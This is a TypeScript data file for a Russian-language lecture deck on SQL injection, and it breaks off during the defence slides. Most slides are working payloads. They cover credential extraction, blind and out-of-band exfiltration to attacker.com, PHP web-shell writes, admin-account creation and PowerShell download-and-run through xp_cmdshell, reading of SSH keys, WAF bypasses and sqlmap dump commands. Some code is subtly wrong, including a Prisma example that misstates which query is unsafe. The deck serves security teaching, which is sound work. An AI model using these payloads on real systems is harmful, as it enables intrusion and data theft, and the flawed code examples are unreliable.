import { Lecture } from "@/types";

export const sqlInjectionLecture: Lecture = {
  id: "sql-injection-lecture",
  title: "SQL-инъекции (SQL Injection)",
  description:
    "Подробное изучение SQL-инъекций: типы, механизмы эксплуатации, методы обнаружения и защиты в современных веб-приложениях",
  groupId: "web-security",
  createdAt: new Date("2025-10-01"),
  updatedAt: new Date("2025-10-01"),
  tags: [
    "web-security",
    "SQL Injection",
    "OWASP",
    "базы данных",
    "безопасность",
  ],
  difficulty: "intermediate",
  duration: 4,

  slides: [
    {
      id: "slide-1",
      title: "SQL-инъекции (SQL Injection)",
      type: "title",
      content: "Типы, механизмы эксплуатации и методы защиты от SQL-инъекций",
      keyPoints: [
        {
          title: "Что такое SQL-инъекция",
          description: "Понимание механизма и последствий атаки",
        },
        {
          title: "Типы SQL-инъекций",
          description: "In-band, Blind, Out-of-band инъекции",
        },
        {
          title: "Методы эксплуатации",
          description: "Практические техники атак на базы данных",
        },
        {
          title: "Защита и предотвращение",
          description: "Современные методы защиты в Node.js и PHP",
        },
      ],
    },

    {
      id: "slide-2",
      title: "Что такое SQL-инъекция?",
      type: "content",
      content:
        "SQL-инъекция — это тип уязвимости веб-приложений, который позволяет злоумышленнику вмешиваться в SQL-запросы, которые приложение отправляет к базе данных. Это происходит, когда пользовательский ввод включается в SQL-запрос без должной валидации или экранирования. SQL-инъекции занимают третье место в OWASP Top 10 2021 и являются одной из самых опасных и распространенных уязвимостей веб-приложений. Успешная атака может привести к несанкционированному доступу к данным, их модификации или удалению, а в некоторых случаях — к полному контролю над сервером базы данных.",
    },

    {
      id: "slide-3",
      title: "Почему SQL-инъекции опасны?",
      type: "list",
      content:
        "SQL-инъекции позволяют злоумышленникам выполнять множество опасных действий:",
      items: [
        "Обход аутентификации — вход в систему без знания паролей",
        "Извлечение конфиденциальных данных — кража паролей, персональных данных, финансовой информации",
        "Модификация данных — изменение или удаление записей в базе данных",
        "Выполнение административных операций — создание новых пользователей, изменение прав доступа",
        "Чтение файлов на сервере — доступ к конфигурационным файлам и исходному коду",
        "Выполнение команд операционной системы — в некоторых случаях возможен полный контроль над сервером",
        "DoS атаки — перегрузка или выведение из строя базы данных",
      ],
    },

    {
      id: "slide-4",
      title: "Статистика SQL-инъекций",
      type: "two-column",
      content: "SQL-инъекции остаются одной из самых опасных угроз",
      leftContent: {
        title: "Распространенность",
        items: [
          "~8% веб-приложений уязвимы к SQLi",
          "Входит в OWASP Top 10 с 2003 года",
          "Обнаруживается в крупных компаниях",
          "Часто встречается в legacy системах",
        ],
      },
      rightContent: {
        title: "Последствия",
        items: [
          "Утечка миллионов записей данных",
          "Финансовые потери компаний",
          "Репутационный ущерб",
          "Нарушение законодательства (GDPR)",
        ],
      },
    },

    {
      id: "slide-5",
      title: "Как работает SQL-инъекция",
      type: "content",
      content:
        "SQL-инъекция работает путем манипуляции SQL-запросами приложения. Когда приложение принимает пользовательский ввод и напрямую включает его в SQL-запрос без валидации, злоумышленник может внедрить собственный SQL-код. Этот код будет выполнен базой данных как часть легитимного запроса. Например, если приложение ищет пользователя по имени, используя конкатенацию строк вместо параметризованных запросов, злоумышленник может закрыть исходный запрос и добавить свой собственный SQL-код, изменив логику выполнения запроса.",
    },

    {
      id: "slide-6",
      title: "Простой пример SQL-инъекции",
      type: "code",
      content: "Классический пример уязвимого кода:",
      codeExample: {
        language: "php",
        title: "Уязвимый PHP код",
        code: `<?php
// УЯЗВИМЫЙ КОД - НЕ ИСПОЛЬЗОВАТЬ
$username = $_POST['username'];
$password = $_POST['password'];

// Опасная конкатенация строк в SQL-запросе
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Вход выполнен успешно!";
} else {
    echo "Неверные учетные данные";
}

/*
Злоумышленник может ввести в поле username:
admin' OR '1'='1' --

Результирующий запрос:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''

Комментарий -- убирает проверку пароля, 
а условие '1'='1' всегда истинно, 
поэтому запрос вернет первого пользователя (обычно admin)
*/`,
      },
    },

    {
      id: "slide-7",
      title: "Типы SQL-инъекций",
      type: "title",
      content: "Классификация SQL-инъекций по методу эксплуатации",
      keyPoints: [
        {
          title: "In-band SQLi",
          description: "Результат атаки виден напрямую в ответе приложения",
        },
        {
          title: "Blind SQLi",
          description:
            "Результат не виден напрямую, требуется анализ поведения",
        },
        {
          title: "Out-of-band SQLi",
          description:
            "Использование альтернативных каналов для получения данных",
        },
      ],
    },

    {
      id: "slide-8",
      title: "In-band SQL-инъекции",
      type: "content",
      content:
        "In-band SQL-инъекции — это самый простой и распространенный тип атак. При этом типе атаки злоумышленник использует тот же канал связи для запуска атаки и получения результатов. Результаты SQL-запроса отображаются непосредственно на веб-странице. Существует два основных подтипа: Error-based (основанные на ошибках) и Union-based (использующие оператор UNION). Error-based инъекции используют сообщения об ошибках базы данных для получения информации о структуре БД, а Union-based объединяют результаты вредоносного запроса с результатами легитимного запроса.",
    },

    {
      id: "slide-9",
      title: "Error-based SQL-инъекция",
      type: "code",
      content: "Пример эксплуатации через сообщения об ошибках:",
      codeExample: {
        language: "php",
        title: "Error-based SQLi",
        code: `<?php
// Уязвимый код
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $query);

/*
Шаг 1: Провоцируем ошибку для получения информации
URL: ?id=1'

Ошибка MySQL:
You have an error in your SQL syntax near ''1''' at line 1

Это подтверждает наличие SQL-инъекции

Шаг 2: Извлекаем версию БД
URL: ?id=1 AND 1=CONVERT(int, @@version) --

Результат: сообщение об ошибке содержит версию MySQL

Шаг 3: Извлекаем имя текущей БД
URL: ?id=1 AND 1=CONVERT(int, database()) --

Шаг 4: Извлекаем имена таблиц
URL: ?id=1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)) --

Шаг 5: Извлекаем имена столбцов
URL: ?id=1 AND 1=CONVERT(int, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)) --

Каждый запрос вызывает ошибку преобразования типов,
которая содержит интересующую нас информацию
*/`,
      },
    },

    {
      id: "slide-10",
      title: "Union-based SQL-инъекция",
      type: "code",
      content: "Использование оператора UNION для извлечения данных:",
      codeExample: {
        language: "sql",
        title: "Union-based SQLi",
        code: `-- Исходный запрос
SELECT id, name, price FROM products WHERE id = 1

-- Шаг 1: Определяем количество столбцов
?id=1 ORDER BY 1-- (работает)
?id=1 ORDER BY 2-- (работает)
?id=1 ORDER BY 3-- (работает)
?id=1 ORDER BY 4-- (ошибка) -> значит 3 столбца

-- Шаг 2: Определяем, какие столбцы отображаются
?id=-1 UNION SELECT 1,2,3--
Результат покажет, какие позиции видны на странице

-- Шаг 3: Извлекаем версию и имя БД
?id=-1 UNION SELECT 1, @@version, database()--

-- Шаг 4: Извлекаем список таблиц
?id=-1 UNION SELECT 1, table_name, 3 
FROM information_schema.tables 
WHERE table_schema = database()--

-- Шаг 5: Извлекаем имена столбцов из таблицы users
?id=-1 UNION SELECT 1, column_name, 3 
FROM information_schema.columns 
WHERE table_name = 'users'--

-- Шаг 6: Извлекаем данные пользователей
?id=-1 UNION SELECT 1, 
CONCAT(username, ':', password), 3 
FROM users--

-- Результат: список всех пользователей с хешами паролей`,
      },
    },

    {
      id: "slide-11",
      title: "Blind SQL-инъекции",
      type: "content",
      content:
        "Blind (слепые) SQL-инъекции возникают, когда приложение уязвимо к SQL-инъекциям, но результаты SQL-запроса не отображаются в ответе. Злоумышленник не видит напрямую результат запроса или сообщения об ошибках. Вместо этого он должен задавать вопросы типа да/нет базе данных и наблюдать за поведением приложения. Существует два подтипа: Boolean-based (основанные на булевой логике) и Time-based (основанные на временных задержках). Эти атаки требуют больше времени, но могут быть автоматизированы с помощью инструментов вроде sqlmap.",
    },

    {
      id: "slide-12",
      title: "Boolean-based Blind SQLi",
      type: "code",
      content: "Извлечение данных через вопросы да/нет:",
      codeExample: {
        language: "javascript",
        title: "Boolean-based Blind SQL Injection",
        code: `// Уязвимый Node.js код
app.get('/product', async (req, res) => {
  const id = req.query.id;
  
  const query = \`SELECT * FROM products WHERE id = \${id}\`;
  const result = await db.query(query);
  
  if (result.length > 0) {
    res.send('Товар найден');
  } else {
    res.send('Товар не найден');
  }
});

/*
Злоумышленник не видит данных, только "найден" или "не найден"

Шаг 1: Проверяем наличие SQLi
?id=1 AND 1=1-- (Товар найден)
?id=1 AND 1=2-- (Товар не найден)
SQLi подтверждена!

Шаг 2: Проверяем существование таблицы users
?id=1 AND (SELECT COUNT(*) FROM users) > 0-- 

Шаг 3: Определяем длину имени первого пользователя
?id=1 AND (SELECT LENGTH(username) FROM users LIMIT 1) > 5--
Перебираем, пока не найдем точную длину

Шаг 4: Извлекаем имя посимвольно
?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1) = 'a'--
?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1) = 'b'--
...продолжаем, пока не найдем 'a' (найдено!)

?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1), 2, 1) = 'a'--
...перебираем второй символ

Процесс медленный, но можно автоматизировать
*/`,
      },
    },

    {
      id: "slide-13",
      title: "Time-based Blind SQLi",
      type: "code",
      content: "Использование временных задержек для извлечения данных:",
      codeExample: {
        language: "sql",
        title: "Time-based Blind SQL Injection",
        code: `-- Уязвимый запрос (без видимых результатов)
SELECT * FROM products WHERE id = [USER_INPUT]

-- MySQL: использование SLEEP()
-- Если условие истинно, запрос задерживается на 5 секунд
?id=1 AND IF(1=1, SLEEP(5), 0)--
(задержка 5 сек -> SQLi работает)

?id=1 AND IF(1=2, SLEEP(5), 0)--
(без задержки)

-- Проверка существования таблицы
?id=1 AND IF(
  (SELECT COUNT(*) FROM users) > 0, 
  SLEEP(5), 
  0
)--

-- Извлечение длины имени пользователя
?id=1 AND IF(
  (SELECT LENGTH(username) FROM users LIMIT 1) > 10,
  SLEEP(5),
  0
)--

-- Извлечение данных посимвольно
?id=1 AND IF(
  SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a',
  SLEEP(5),
  0
)--

-- PostgreSQL: использование pg_sleep()
?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQL Server: использование WAITFOR DELAY
?id=1; IF (1=1) WAITFOR DELAY '00:00:05'--

-- Автоматизация с помощью скрипта
-- Можно написать скрипт, который будет:
-- 1. Отправлять запросы с разными символами
-- 2. Измерять время ответа
-- 3. Если задержка ~5 сек, символ найден
-- 4. Переходить к следующему символу`,
      },
    },

    {
      id: "slide-14",
      title: "Out-of-band SQL-инъекции",
      type: "content",
      content:
        "Out-of-band SQL-инъекции используют альтернативные каналы связи для передачи данных. Этот тип атаки применяется, когда невозможно получить результаты через обычный HTTP-ответ и даже Boolean/Time-based методы не работают. Злоумышленник заставляет базу данных отправить данные на внешний сервер, контролируемый атакующим, используя функции БД для работы с сетью (например, UTL_HTTP в Oracle, xp_cmdshell в MS SQL Server, LOAD_FILE в MySQL). Это один из самых сложных типов SQL-инъекций, но и самый мощный при правильной эксплуатации.",
    },

    {
      id: "slide-15",
      title: "Пример Out-of-band SQLi",
      type: "code",
      content: "Извлечение данных через DNS или HTTP запросы:",
      codeExample: {
        language: "sql",
        title: "Out-of-band SQL Injection",
        code: `-- MS SQL Server: использование xp_dirtree для DNS запроса
?id=1; DECLARE @data varchar(1024);
SELECT @data = (SELECT TOP 1 username + ':' + password FROM users);
EXEC('master..xp_dirtree "\\\\' + @data + '.attacker.com\\share"')--

-- Результат: DNS запрос к admin:hash123.attacker.com
-- Злоумышленник получает данные через логи DNS сервера

-- =====================================

-- Oracle: использование UTL_HTTP для HTTP запроса
?id=1 UNION SELECT UTL_HTTP.request(
  'http://attacker.com/log?data=' || 
  (SELECT username || ':' || password FROM users WHERE ROWNUM=1)
) FROM dual--

-- Результат: HTTP запрос к attacker.com с данными в URL

-- =====================================

-- MySQL: использование LOAD_FILE и OUTFILE (если есть права)
?id=1 UNION SELECT 
  LOAD_FILE(CONCAT('\\\\\\\\', 
    (SELECT GROUP_CONCAT(username, ':', password) FROM users), 
    '.attacker.com\\\\share'))--

-- =====================================

-- PostgreSQL: использование COPY TO PROGRAM
?id=1; COPY (SELECT username || ':' || password FROM users) 
TO PROGRAM 'curl http://attacker.com/log?data=$(cat)'--

-- =====================================

-- Настройка сервера злоумышленника для получения данных
-- HTTP сервер:
const express = require('express');
const app = express();

app.get('/log', (req, res) => {
  const data = req.query.data;
  console.log('Stolen data:', data);
  fs.appendFileSync('stolen.txt', data + '\\n');
  res.sendStatus(200);
});

// DNS сервер для логирования поддоменов
// Можно использовать сервисы типа Burp Collaborator`,
      },
    },

    {
      id: "slide-16",
      title: "Второй порядок SQL-инъекции",
      type: "content",
      content:
        "Second-order (второго порядка) SQL-инъекции — это более сложный тип атаки, при котором вредоносный payload сохраняется в базе данных во время одной операции, а затем выполняется при другой операции. Приложение может корректно экранировать данные при их сохранении, но затем использовать сохраненные данные в другом SQL-запросе без должной обработки. Например, пользователь регистрируется с именем содержащим SQL-код, система корректно его сохраняет, но позже, при генерации отчета или в профиле, эти данные используются в новом запросе без экранирования. Эти атаки сложно обнаружить, так как они требуют анализа всего потока данных в приложении.",
    },

    {
      id: "slide-17",
      title: "Пример Second-order SQLi",
      type: "code",
      content: "SQL-инъекция второго порядка:",
      codeExample: {
        language: "javascript",
        title: "Second-order SQL Injection",
        code: `// Node.js + MySQL
const mysql = require('mysql2/promise');

// Шаг 1: Регистрация пользователя
app.post('/register', async (req, res) => {
  const { username, email } = req.body;
  
  // Данные корректно экранируются при вставке
  await db.execute(
    'INSERT INTO users (username, email) VALUES (?, ?)',
    [username, email]
  );
  // Злоумышленник регистрируется с username: admin'-- 
  // Данные безопасно сохранены в БД
});

// Шаг 2: Обновление профиля (УЯЗВИМЫЙ КОД)
app.post('/update-profile', async (req, res) => {
  const userId = req.session.userId;
  const { bio } = req.body;
  
  // Получаем username из БД
  const [user] = await db.query(
    'SELECT username FROM users WHERE id = ?',
    [userId]
  );
  
  // ОПАСНО! Используем сохраненный username без экранирования
  const query = \`UPDATE users SET bio = '\${bio}' 
                 WHERE username = '\${user[0].username}'\`;
  
  await db.query(query);
  /*
  Если username = "admin'-- ", результирующий запрос:
  UPDATE users SET bio = 'test' WHERE username = 'admin'-- '
  
  Комментарий -- обрезает запрос, и bio обновится у admin!
  */
});

// Более опасный пример
app.get('/admin/search-logs', async (req, res) => {
  const username = req.query.username;
  
  // Сохраняем в БД (корректно)
  await db.execute(
    'INSERT INTO search_history (username, timestamp) VALUES (?, NOW())',
    [username]
  );
  
  // Потом используем для генерации отчета (УЯЗВИМО!)
  const [history] = await db.query(
    'SELECT username FROM search_history'
  );
  
  for (let record of history) {
    // Строим запрос со значениями из БД без проверки
    const logQuery = \`INSERT INTO audit_log (action) 
                      VALUES ('User \${record.username} searched')\`;
    await db.query(logQuery);
  }
  /*
  Если в search_history есть запись с username: 
  admin'); DELETE FROM users WHERE '1'='1
  
  Результирующий запрос:
  INSERT INTO audit_log (action) VALUES ('User admin'); 
  DELETE FROM users WHERE '1'='1 searched')
  
  Все пользователи будут удалены!
  */
});`,
      },
    },

    {
      id: "slide-18",
      title: "Продвинутые техники эксплуатации",
      type: "title",
      content: "Сложные методы эксплуатации SQL-инъекций",
      keyPoints: [
        {
          title: "Stacked queries",
          description: "Выполнение нескольких запросов за раз",
        },
        {
          title: "Обход WAF",
          description: "Техники уклонения от систем защиты",
        },
        {
          title: "Извлечение файлов",
          description: "Чтение файлов с сервера через SQL",
        },
        {
          title: "Выполнение команд ОС",
          description: "Получение контроля над сервером",
        },
      ],
    },

    {
      id: "slide-19",
      title: "Stacked Queries",
      type: "code",
      content: "Выполнение нескольких SQL-запросов последовательно:",
      codeExample: {
        language: "sql",
        title: "Stacked Queries Attack",
        code: `-- Не все БД и драйверы поддерживают stacked queries
-- PostgreSQL, MS SQL Server - поддерживают
-- MySQL с mysqli_multi_query - поддерживает
-- MySQL с PDO - НЕ поддерживает (по умолчанию)

-- Базовый пример
?id=1; DROP TABLE users--

-- Результат: основной запрос + удаление таблицы
SELECT * FROM products WHERE id = 1; DROP TABLE users--

-- Создание нового администратора
?id=1; INSERT INTO users (username, password, role) 
VALUES ('hacker', 'hashed_password', 'admin')--

-- Изменение данных существующего пользователя
?id=1; UPDATE users SET password = 'newpass' WHERE username = 'admin'--

-- Получение списка всех таблиц (MS SQL Server)
?id=1; SELECT name FROM sys.tables FOR XML PATH('')--

-- Включение xp_cmdshell в MS SQL Server
?id=1; EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE--

-- Выполнение команды ОС (MS SQL Server)
?id=1; EXEC xp_cmdshell 'whoami'--

-- PostgreSQL: создание функции для выполнения команд
?id=1; CREATE OR REPLACE FUNCTION exec_cmd(text) 
RETURNS text AS $$
  import subprocess
  return subprocess.check_output(args[0], shell=True)
$$ LANGUAGE plpythonu;

SELECT exec_cmd('id')--

-- Защита: проверяйте, не используется ли 
-- mysqli_multi_query или PDO::MYSQL_ATTR_MULTI_STATEMENTS`,
      },
    },

    {
      id: "slide-20",
      title: "Обход WAF и фильтров",
      type: "code",
      content: "Техники обхода систем защиты веб-приложений:",
      codeExample: {
        language: "sql",
        title: "WAF Bypass Techniques",
        code: `-- Изменение регистра
SeLeCt * FrOm users

-- Использование комментариев
SELECT/**/*/**/FROM/**/users
SELECT/*comment*/*/*another*/FROM/**/users

-- Обход фильтрации пробелов
SELECT*FROM users WHERE id=1
SELECT%0a*%0aFROM%0ausers
SELECT%09*%09FROM%09users -- TAB символ

-- Обход фильтрации ключевых слов через конкатенацию
'UNION' -> 'UNI'+'ON'
'UNION' -> CONCAT('UNI','ON')
'SELECT' -> 'SEL' || 'ECT' (PostgreSQL)

-- Double encoding
' OR '1'='1 -> %27%20OR%20%271%27%3D%271
-> %2527%2520OR%2520%25271%2527%253D%25271

-- Использование альтернативных операторов
AND -> &&
OR -> ||
= -> LIKE
' ' -> /**/

-- Обход через Unicode
SELECT -> %u0053%u0045%u004c%u0045%u0043%u0054

-- Научная нотация для чисел
WHERE id = 1 -> WHERE id = 1e0
WHERE id = 1 -> WHERE id = 0x1

-- Обход blacklist с помощью альтернативных функций
SUBSTRING -> SUBSTR -> MID
ASCII -> ORD
BENCHMARK -> SLEEP

-- Использование hex-кодирования
'admin' -> 0x61646d696e
'UNION' -> 0x554e494f4e

-- Комбинированный обход
?id=1+UnIoN+SeLeCt+1,2,concat(0x61,0x64,0x6d,0x69,0x6e),4--+-

-- Обфускация через вложенные SELECT
?id=(SELECT+1)UNION(SELECT+2,3,4)

-- PostgreSQL: использование :: для обхода
'text' -> 'text'::text
1 -> 1::int`,
      },
    },

    {
      id: "slide-21",
      title: "Чтение файлов через SQL-инъекции",
      type: "code",
      content: "Извлечение файлов с сервера через SQL:",
      codeExample: {
        language: "sql",
        title: "Reading Files via SQL Injection",
        code: `-- MySQL: использование LOAD_FILE()
?id=-1 UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3--

-- Чтение конфигурационных файлов приложения
?id=-1 UNION SELECT 1, LOAD_FILE('/var/www/html/config.php'), 3--

-- Чтение файлов веб-приложения
?id=-1 UNION SELECT LOAD_FILE('/var/www/html/index.php')--

-- Чтение приватных ключей SSH
?id=-1 UNION SELECT LOAD_FILE('/root/.ssh/id_rsa')--

-- Чтение логов для поиска учетных данных
?id=-1 UNION SELECT LOAD_FILE('/var/log/apache2/access.log')--

-- PostgreSQL: использование pg_read_file()
?id=-1 UNION SELECT pg_read_file('/etc/passwd', 0, 1000)--

-- MS SQL Server: использование OPENROWSET
?id=-1 UNION SELECT * FROM OPENROWSET(
  BULK '/etc/passwd', SINGLE_CLOB
) AS correlation_name--

-- Oracle: использование UTL_FILE
-- Требует создания DIRECTORY объекта (нужны права DBA)

-- Обход фильтров путей через hex
?id=-1 UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--
-- 0x2f6574632f706173737764 = /etc/passwd

-- Условия для успешного чтения файлов:
-- 1. Файл должен существовать на сервере
-- 2. Пользователь БД должен иметь права на чтение файла
-- 3. Путь к файлу должен быть известен или угадан
-- 4. secure_file_priv не должен блокировать доступ (MySQL)`,
      },
    },

    {
      id: "slide-22",
      title: "Запись файлов и получение shell",
      type: "code",
      content: "Загрузка веб-шелла через SQL-инъекцию:",
      codeExample: {
        language: "sql",
        title: "Writing Webshell via SQL Injection",
        code: `-- MySQL: использование INTO OUTFILE
?id=-1 UNION SELECT 
  '<?php system($_GET["cmd"]); ?>', 
  NULL, NULL 
INTO OUTFILE '/var/www/html/shell.php'--

-- Затем обращаемся к: http://target.com/shell.php?cmd=whoami

-- Запись более продвинутого шелла
?id=-1 UNION SELECT 
  '<?php eval($_POST["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/backdoor.php'--

-- MS SQL Server: использование xp_cmdshell
-- Сначала включаем xp_cmdshell (если отключен)
?id=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- Создаем пользователя
?id=1; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'--
?id=1; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

-- Загружаем и выполняем реверс-шелл
?id=1; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")"'--

-- PostgreSQL: использование COPY TO PROGRAM
?id=1; COPY (SELECT '<?php system($_GET["cmd"]); ?>') 
TO PROGRAM 'tee /var/www/html/shell.php'--

-- Альтернатива: использование lo_export (Large Objects)
?id=1; SELECT lo_from_bytea(12345, 
  '<?php system($_GET["cmd"]); ?>');
SELECT lo_export(12345, '/var/www/html/shell.php')--

-- Ограничения:
-- 1. Пользователь БД должен иметь FILE привилегию (MySQL)
-- 2. Директория должна быть доступна для записи
-- 3. secure_file_priv может ограничивать запись (MySQL)
-- 4. SELinux/AppArmor могут блокировать запись`,
      },
    },

    {
      id: "slide-23",
      title: "Автоматизация с sqlmap",
      type: "content",
      content:
        "sqlmap — это мощный инструмент для автоматического обнаружения и эксплуатации SQL-инъекций. Он поддерживает обнаружение всех типов SQL-инъекций (Boolean-based, Time-based, Error-based, UNION query, Stacked queries), работу с различными СУБД (MySQL, PostgreSQL, Oracle, MS SQL Server, SQLite и другие), автоматическое извлечение данных из БД, чтение и запись файлов, выполнение команд ОС, получение интерактивного shell. sqlmap может автоматически обходить WAF, работать через прокси, использовать различные техники обфускации и подбирать оптимальный метод атаки для каждой конкретной ситуации.",
    },

    {
      id: "slide-24",
      title: "Использование sqlmap",
      type: "code",
      content: "Основные команды sqlmap для тестирования:",
      codeExample: {
        language: "bash",
        title: "sqlmap Commands",
        code: `# Базовое сканирование URL
sqlmap -u "http://example.com/page.php?id=1"

# Сканирование с POST данными
sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"

# Использование файла запроса из Burp Suite
sqlmap -r request.txt

# Указание конкретного параметра для тестирования
sqlmap -u "http://example.com/page.php?id=1&cat=2" -p id

# Указание типа СУБД
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql

# Уровень и риск тестирования (1-5)
sqlmap -u "http://example.com/page.php?id=1" --level=3 --risk=2

# Перечисление баз данных
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Перечисление таблиц в конкретной БД
sqlmap -u "http://example.com/page.php?id=1" -D mydb --tables

# Перечисление столбцов таблицы
sqlmap -u "http://example.com/page.php?id=1" -D mydb -T users --columns

# Извлечение данных из таблицы
sqlmap -u "http://example.com/page.php?id=1" -D mydb -T users --dump

# Извлечение только конкретных столбцов
sqlmap -u "http://example.com/page.php?id=1" -D mydb -T users -C username,password --dump

# Чтение файла с сервера
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Запись файла на сервер
sqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Получение OS shell
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# Обход WAF с помощью tamper скриптов
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,between

# Работа через прокси
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Сохранение сессии для продолжения
sqlmap -u "http://example.com/page.php?id=1" --batch --flush-session

# Агрессивное сканирование (максимальный level и risk)
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --batch`,
      },
    },

    {
      id: "slide-25",
      title: "Защита от SQL-инъекций: Основные принципы",
      type: "content",
      content:
        "Защита от SQL-инъекций требует комплексного подхода и соблюдения нескольких ключевых принципов. Самый важный и эффективный метод — использование параметризованных запросов (prepared statements), которые полностью отделяют SQL-код от данных. Никогда не стройте SQL-запросы через конкатенацию строк с пользовательским вводом. Применяйте валидацию входных данных по принципу whitelist (разрешайте только ожидаемые форматы). Используйте ORM (Object-Relational Mapping) библиотеки, которые автоматически защищают от SQL-инъекций. Применяйте принцип минимальных привилегий для пользователей БД. Никогда не показывайте пользователям детальные сообщения об ошибках БД.",
    },

    {
      id: "slide-26",
      title: "Параметризованные запросы в Node.js",
      type: "code",
      content: "Безопасные запросы с использованием параметров:",
      codeExample: {
        language: "javascript",
        title: "Safe SQL Queries in Node.js",
        code: `// ============ MySQL2 ============
const mysql = require('mysql2/promise');

// НЕБЕЗОПАСНО - конкатенация строк
const unsafeQuery = async (userId) => {
  const query = \`SELECT * FROM users WHERE id = \${userId}\`;
  const [rows] = await connection.query(query);
  return rows;
};

// БЕЗОПАСНО - параметризованный запрос
const safeQuery = async (userId) => {
  const query = 'SELECT * FROM users WHERE id = ?';
  const [rows] = await connection.execute(query, [userId]);
  return rows;
};

// Множественные параметры
const safeLogin = async (username, password) => {
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  const [rows] = await connection.execute(query, [username, password]);
  return rows[0];
};

// Использование именованных параметров
const safeSearch = async (searchTerm, category) => {
  const query = \`
    SELECT * FROM products 
    WHERE name LIKE ? AND category = ?
    ORDER BY price DESC
  \`;
  const [rows] = await connection.execute(
    query, 
    [\`%\${searchTerm}%\`, category]
  );
  return rows;
};

// ============ PostgreSQL (node-postgres) ============
const { Pool } = require('pg');
const pool = new Pool();

// БЕЗОПАСНО - использование $1, $2, $3 для параметров
const getUserById = async (userId) => {
  const query = 'SELECT * FROM users WHERE id = $1';
  const result = await pool.query(query, [userId]);
  return result.rows[0];
};

const createUser = async (username, email, hashedPassword) => {
  const query = \`
    INSERT INTO users (username, email, password) 
    VALUES ($1, $2, $3) 
    RETURNING id
  \`;
  const result = await pool.query(query, [username, email, hashedPassword]);
  return result.rows[0].id;
};

// ============ SQLite (better-sqlite3) ============
const Database = require('better-sqlite3');
const db = new Database('mydb.sqlite');

// БЕЗОПАСНО - использование ? для параметров
const getUser = db.prepare('SELECT * FROM users WHERE id = ?');
const user = getUser.get(userId);

// Именованные параметры
const updateUser = db.prepare(\`
  UPDATE users 
  SET email = @email, updated_at = @updated 
  WHERE id = @id
\`);

updateUser.run({
  id: userId,
  email: newEmail,
  updated: new Date().toISOString()
});`,
      },
    },

    {
      id: "slide-27",
      title: "ORM и Query Builders",
      type: "code",
      content: "Использование безопасных ORM: Prisma и Drizzle:",
      codeExample: {
        language: "javascript",
        title: "Prisma and Drizzle ORM",
        code: `// ============ Prisma ORM ============
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

// БЕЗОПАСНО - Prisma автоматически использует параметризованные запросы
const getUserById = async (userId) => {
  const user = await prisma.user.findUnique({
    where: { id: userId }
  });
  return user;
};

// Поиск с фильтрами
const searchUsers = async (searchTerm) => {
  const users = await prisma.user.findMany({
    where: {
      OR: [
        { username: { contains: searchTerm } },
        { email: { contains: searchTerm } }
      ]
    },
    take: 10
  });
  return users;
};

// Сложные запросы с relations
const getUserWithPosts = async (userId) => {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    include: {
      posts: {
        where: { published: true },
        orderBy: { createdAt: 'desc' }
      }
    }
  });
  return user;
};

// ВНИМАНИЕ: $queryRaw может быть уязвим если использовать неправильно
// НЕБЕЗОПАСНО
const unsafeRaw = async (userId) => {
  const users = await prisma.$queryRaw\`
    SELECT * FROM users WHERE id = \${userId}
  \`;
  return users;
};

// БЕЗОПАСНО - используйте Prisma.sql для параметров
const safeRaw = async (userId) => {
  const users = await prisma.$queryRaw\`
    SELECT * FROM users WHERE id = \${Prisma.sql\`\${userId}\`}
  \`;
  return users;
};

// ============ Drizzle ORM ============
const { drizzle } = require('drizzle-orm/node-postgres');
const { eq, like, and, or } = require('drizzle-orm');
const { users, posts } = require('./schema');

const db = drizzle(pool);

// БЕЗОПАСНО - Drizzle автоматически параметризует запросы
const getUserById = async (userId) => {
  const user = await db
    .select()
    .from(users)
    .where(eq(users.id, userId))
    .limit(1);
  return user[0];
};

// Поиск с условиями
const searchUsers = async (searchTerm) => {
  const results = await db
    .select()
    .from(users)
    .where(
      or(
        like(users.username, \`%\${searchTerm}%\`),
        like(users.email, \`%\${searchTerm}%\`)
      )
    )
    .limit(10);
  return results;
};

// JOIN запросы
const getUsersWithPosts = async () => {
  const results = await db
    .select({
      user: users,
      post: posts
    })
    .from(users)
    .leftJoin(posts, eq(users.id, posts.authorId));
  return results;
};

// Сложные фильтры
const getActiveUsers = async (minPosts, registeredAfter) => {
  const results = await db
    .select()
    .from(users)
    .where(
      and(
        eq(users.status, 'active'),
        gte(users.postCount, minPosts),
        gte(users.createdAt, registeredAfter)
      )
    );
  return results;
};

// БЕЗОПАСНО даже для сложных условий
